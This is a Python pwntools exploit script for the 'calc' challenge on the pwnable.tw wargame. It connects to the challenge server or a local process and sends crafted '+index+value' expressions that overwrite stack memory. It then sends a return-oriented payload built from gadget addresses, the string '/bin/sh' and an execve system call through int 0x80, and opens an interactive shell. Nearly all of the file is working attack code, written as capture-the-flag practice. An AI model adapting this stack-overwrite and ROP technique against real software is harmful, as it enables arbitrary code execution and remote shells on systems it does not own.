#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('calc', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*eval
        b*eval+76
        b*main+84
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('chall.pwnable.tw', 10100)
else:
    p = process([exe.path])

ru(b'=== Welcome to SECPROG calculator ===')

# load = flat(
    # ,
# )

# sl(b'+369+158512')

# sl(b'+370+135025968')

pop = 0x80701d0 # pop edx ; pop ecx ; pop ebx ; ret
pop_eax=  0x0805c34b
leave_ret = 0x08048D88    
int_0x80 = 0x8070880 
pop_ebp = 0x08048FF6 
shell = 0x80eb038
# win = [
# ("+369+158550"),
# "+370-158294"
# "+371+135022050",


# ]
sl("+369+158550".encode())

sl("+370-158294".encode())

sl("+371+135022050".encode())

sl(b"+372-135022050")

sl(b'+373-426647')

sl(b'+374-426644')

sl(b'+375+134252012')

## pop_rbp
# GDB()
sl(b'+376+264714')

sl(b'+377+134915634')

# # leave ret
sl(b'+378-399530')
GDB()
sl(b'win')
input("send")
# leave: 0x80eb03c
load =flat(
    b'/bin/sh\0',
    pop,
    0,
    0,
    shell,
    pop_eax,
    0x0b,
    int_0x80
)

s(load)
p.interactive()
